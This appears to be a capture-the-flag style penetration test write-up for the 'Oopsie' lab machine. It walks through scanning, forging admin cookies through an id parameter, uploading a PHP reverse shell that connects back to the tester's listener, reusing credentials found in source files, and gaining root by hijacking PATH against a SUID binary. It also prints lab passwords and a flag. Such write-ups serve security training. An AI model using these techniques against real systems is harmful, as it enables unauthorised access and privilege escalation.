# Pentest raport for Oopse box 

#### CVSS Base Score 7.5 (High)

#### CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute

#### CWE-200: Exposure of Sensitive Information to an Unauthorized Actor

Description: During our pentest we use various techniques, including parameter  manipulation inside HTTP request, code execution,  and privilege escalation, were used to gain access to the system. The  steps taken during the assessment are detailed in this report to provide insights into the detection and exploitation of vulnerabilities.

###### POC :

Begin the penetration test by conducting initial scans on the target system.

```bash
nmap -sV -sC 10.129.245.13
Starting Nmap 7.93 ( https://nmap.org ) at 2023-10-07 20:26 BST
Nmap scan report for 10.129.245.13
Host is up (0.039s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61e43fd41ee2b2f10d3ced36283667c7 (RSA)
|   256 241da417d4e32a9c905c30588f60778d (ECDSA)
|_  256 78030eb4a1afe5c2f98d29053e29c9f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome]
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.99 seconds
┌─[parrot@parrot]─[~]
```

Open SSH port observed, but we don't have valid credentials.

We visit the IP using the web browser where we face
a website.

​          ![](/.Oopse_img/Oopse1.png)



We will list the site where we will find the gateway to the server, but first we can try to map it using Burp Suite Spider, as it is a less invasive tool.



![](/.Oopse_img/O.png)               

And we found a path to the website's login page, so we visited it.

![](/.Oopse_img/oo.png)

Let's try our luck and try the combination admin/admin. 

Not this time



What's left for us is to log in as a guest and take a look for some elevation of privilege



![](/.Oopse_img/ooo.png)



Inside the 'Account' card, we see a table with users. When we check, we  found that the Access ID and name are the same as the cookies for our  user.



![](/.Oopse_img/oooo.png)



We also noticed a parameter within the link that we can manipulate. When we attempt to modify this parameter to '1,' we are able to view the  Access ID and name for the website's admin in the table. What we can do  next is use these values as cookies using Burp Suite.



![](/.Oopse_img/ooooo.png)



```           http
GET /cdn-cgi/login/admin.php?content=accounts&id=1 HTTP/1.1
Host: 10.129.245.13
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: user=34322; role=admin 
Upgrade-Insecure-Requests: 1
```



The 'uploads' section is intended only for administrators. With our  newfound admin website privileges, we can now send a PHP reverse shell  to the server.

![](/.Oopse_img/ooooooo.png)

```          http
Host: 10.129.245.13
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.245.13/cdn-cgi/login/admin.php?content=uploads
Content-Type: multipart/form-data; boundary=---------------------------32846801334168837286513914441
Content-Length: 5836
Origin: http://10.129.245.13
DNT: 1
Connection: close
Cookie: user=34322; role=admin 
Upgrade-Insecure-Requests: 1
```

After that, we need to find the location of our file with the reverse  shell. To do this, we're going to use Gobuster to enumerate and locate  hidden folders on the web server.

```          bash
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.245.13
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/10/07 20:36:19 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://10.129.245.13/css/]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.245.13/fonts/]
/images               (Status: 301) [Size: 315] [--> http://10.129.245.13/images/]
/index.php            (Status: 200) [Size: 10932]                                 
/js                   (Status: 301) [Size: 311] [--> http://10.129.245.13/js/]    
/server-status        (Status: 403) [Size: 278]                                   
/themes               (Status: 301) [Size: 315] [--> http://10.129.245.13/themes/]
/uploads              (Status: 301) [Size: 316] [--> http://10.129.245.13/uploads/]
                                                                                   
===============================================================
2023/10/07 20:36:38 Finished
===============================================================
┌─[parrot@parrot]─[~]
```

We found the 'uploads' folder. Now, we are going to set up a listener and visit http://10.129.245.13/uploads/shell.php to establish a shell on our listener's port. 

```                                                                        bash
┌─[parrot@parrot]─[/usr/share/webshells/php]
└──╼ $nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.15.11] from (UNKNOWN) [10.129.245.13] 46544
Linux oopsie 4.15.0-76-generic #86-Ubuntu SMP Fri Jan 17 17:24:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 21:11:56 up  1:55,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

to make our shell more useful, we can spawn a Python shell using the command ```python3 -c 'import pty;pty.spawn("/bin/bash")```.

From now on, we are able to view the user flag. 

```          bash
$ cat user.txt
f2c74ee8db7983851ab2a96a44eb7981
```

We're going to search for files responsible for logging inside the web  server directory while checking for any invalid configurations. We will  use this command : 

``` www-data@oopsie://var/www/html/cdn-cgi/login$ cat * | grep -i pass*```  

We found some interesting data.

```bash
www-data@oopsie://var/www/html/cdn-cgi/login$ cat * | grep -i pass*
cat * | grep -i pass*
if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
<input type="password" name="password" placeholder="Password" />
```



By checking the available users in the `/etc/passwd` file, we found only two users with bash privileges: Robert and root. We can try  to use the password from the file with the user 'Robert'. 

```bash
www-data@oopsie:/etc$ su robert
su robert
Password: MEGACORP_4dm1n!!

su: Authentication failure
```



Unfortunately, this isn't the password for the user 'Robert,' so we continue searching.

We found something interesting inside `db.php`.

```bash
cat db.php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

We tried these as well.

```bash 
www-data@oopsie:/var/www/html/cdn-cgi/login$ su robert 
su robert 
Password: M3g4C0rpUs3r!

robert@oopsie:/var/www/html/cdn-cgi/login$ 
```

We got it! We're logged in as the user Robert. Now, let's proceed with privilege escalation.



Before we use any enumeration scripts, we're going to check the basics like 'id' and 'sudo' misconfigurations.

```bash
robert@oopsie:/var/www/html/cdn-cgi/login$ sudo -l
sudo -l
[sudo] password for robert: M3g4C0rpUs3r!

Sorry, user robert may not run sudo on oopsie.

```

Unfortunately, as the user Robert, we are not able to run 'sudo'.

```bash
robert@oopsie:/var/www/html/cdn-cgi/login$ id
id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

We can see that the user Robert belongs to the `bugtracker` group, which could be our path to gaining admin privileges.

The first thing we're going to do is check if there are any files belonging to that group.

```bash
robert@oopsie:/var/www/html/cdn-cgi/login$ find / -group bugtracker 2>/dev/null
<cdn-cgi/login$ find / -group bugtracker 2>/dev/null
/usr/bin/bugtracker
robert@oopsie:/var/www/html/cdn-cgi/login$ 
```

We found a file. Let's check its permissions and determine its file type.

```bash	
robert@oopsie:/var/www/html/cdn-cgi/login$ ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
<-la /usr/bin/bugtracker && file /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
robert@oopsie:/var/www/html/cdn-cgi/login$ 
```

We see that the file has the SUID bit set, which can be a promising path to privilege escalation. The file likely has root privileges.

We will run the script to observe its behavior

```bash
robert@oopsie:/$ usr/bin/bugtracker
usr/bin/bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 12
12
---------------

cat: /root/reports/12: No such file or directory
```

We see that the script is using 'cat' to print its contents. We can utilize this to create a command with the content : `          /bin/sh` 

```bash
robert@oopsie:/tmp$ echo "/bin/sh" > cat    
echo "/bin/sh" > cat
```

Let's elevate the privileges for this file to allow execution.

`          robert@oopsie:/tmp$ chmod +x cat`          

Next, we're going to add the directory containing that file to the PATH variable to make it an executable command

`          robert@oopsie:/tmp$ export PATH=/tmp:$PATH`          

check 

> ```bash
> echo $PATH
> /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
> ```



Finally, execute our 'bugtracker' from the 'tmp' directory.



```bash
robert@oopsie:/tmp$ bugtracker
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 

1
1
---------------

# whomai
whomai
/bin/sh: 1: whomai: not found
# whoami
whoami
root

```

Now we only have to find root flag .

